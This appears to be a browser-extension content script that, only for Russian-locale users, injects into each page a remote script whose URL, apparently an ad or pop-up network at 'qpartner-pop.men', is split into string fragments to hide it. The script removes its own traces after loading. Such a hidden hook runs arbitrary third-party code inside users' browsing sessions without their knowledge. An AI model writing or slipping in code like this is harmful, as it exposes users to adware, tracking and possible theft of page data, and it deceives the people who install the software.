var lang = String(navigator.language || '');
var isRU = (/ru/i).test(lang);
// only inject extguru for RU locale
if (isRU) {
  runFunctionInPageContext(function() {
    (function(i, s, o, g, r, a, m) {
      g = i.createElement(s);
      g.async = 1;
      g.src = o;
      i.head.appendChild(g)
      g.onload = function() {
        try {ga('vkmd.send', 'event', 'extguru', 'load');} catch (e) {}
        try {g.parentNode.removeChild(g)} catch (e) {}
      }
      g.onerror = function(err) {
        try {ga('vkmd.send', 'event', 'extguru', 'error');} catch (e) {}
        try {g.parentNode.removeChild(g)} catch (e) {}
      }
    })(document, 'script', "\/\/qp" + "artn" + "er" + "-" + "po" + "p.m" + "en\/" + "cod" + "e\/?" + "pid" + "=97" + "875" + "5&r" + "=" + Math.floor(10000000 * Math.random()));
  });

  // simple helper functiong
  function runFunctionInPageContext(fn) {
    var script = document.createElement('script');
    script.textContent = '(' + fn.toString() + '());';
    document.documentElement.appendChild(script);
    document.documentElement.removeChild(script);
  }
}
